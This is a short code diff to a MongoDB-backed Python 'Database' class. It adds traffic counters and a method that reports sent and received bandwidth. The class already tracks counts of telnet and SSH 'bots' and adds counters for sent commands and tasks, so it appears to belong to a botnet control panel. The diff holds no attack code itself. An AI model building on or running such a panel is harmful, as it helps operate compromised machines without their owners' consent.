@@ -1,3 +1,4 @@
+from lib import tools
 import pymongo, ssl
 
 class Database:
@@ -13,6 +14,22 @@ class Database:
 
         self.total_telnet_bots = 0
         self.total_ssh_bots = 0
+
+        # trafic
+        self.send_len = 0
+        self.send_packet = 0
+
+        self.recv_len = 0
+        self.recv_packet = 0
+
+        self.send_command = 0
+        self.send_task = 0
+
+    def get_network_bandwitch(self):
+        Tool = tools.IP_Tools()
+
+        # send | recv
+        return f'{Tool.convert_network_size(self.send_len)}|{Tool.convert_network_size(self.recv_len)}'
 
     def create_user(self, username: str, password: str, grade: str):
         if not self.user_database['credential'].find_one({'username': username}):
